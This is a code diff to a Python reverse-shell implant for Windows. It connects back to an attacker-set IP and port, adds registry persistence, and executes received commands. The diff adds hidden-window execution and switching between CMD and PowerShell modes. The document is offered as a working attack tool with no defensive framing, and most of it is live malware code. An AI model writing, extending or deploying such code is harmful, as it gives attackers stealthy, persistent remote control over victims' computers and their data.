@@ -7,9 +7,11 @@ import winreg
 import ctypes
 import sys
 
-ATTACKER_IP = "ATTACKER_IP"  # Change to your attacker's IP
-PORT = 4444  # Reverse shell port
+ATTACKER_IP = "your attacker's IP"  # Change to your attacker's IP
+PORT = 2000  # Reverse shell port
 HTTP_PORT = 8080  # File transfer HTTP server port
+CREATE_NO_WINDOW = 0x08000000  # To hide the subprocess window
+
 
 
 
@@ -82,6 +84,23 @@ def add_persistence():
     except Exception as e:
         return f"[-] Persistence failed: {e}\n"
 
+def execute_command(command, mode="cmd"):
+    """Executes a command silently in either CMD or PowerShell."""
+    try:
+        if mode == "powershell":
+            full_command = ["powershell", "-Command", command]
+        else:
+            full_command = ["cmd", "/c", command]
+
+        result = subprocess.run(
+            full_command,
+            capture_output=True,
+            creationflags=CREATE_NO_WINDOW
+        )
+        return result.stdout + result.stderr
+    except Exception as e:
+        return str(e).encode()
+
 def connect_back():
     """Creates a reverse shell and handles commands from the attacker"""
     while True:
@@ -90,7 +109,7 @@ def connect_back():
             client.connect((ATTACKER_IP, PORT))
 
             persistence_message = add_persistence()
-            
+            shell_mode = "cmd"  # Default shell mode
 
             
             while True:
@@ -98,6 +117,13 @@ def connect_back():
                 if cmd.lower() == "exit":
                     break
 
+                elif cmd.lower() == "cmd":
+                    shell_mode = "cmd"
+                    client.send(b"[+] Switched to CMD mode.\n")
+
+                elif cmd.lower() == "powershell":
+                    shell_mode = "powershell"
+                    client.send(b"[+] Switched to PowerShell mode.\n")
 
                 elif cmd.lower() == "help":
                     help_message = """
@@ -140,8 +166,9 @@ def connect_back():
                     receive_file(client, filename)
 
                 else:
-                    output = subprocess.run(cmd, shell=True, capture_output=True)
-                    client.send(output.stdout + output.stderr)
+                   output = execute_command(cmd, shell_mode)
+                   client.send(output if output else b"\n")
+
             
             client.close()
         except:
@@ -156,4 +183,4 @@ if __name__ == "__main__":
 
     connect_back()     
     
-     
+       
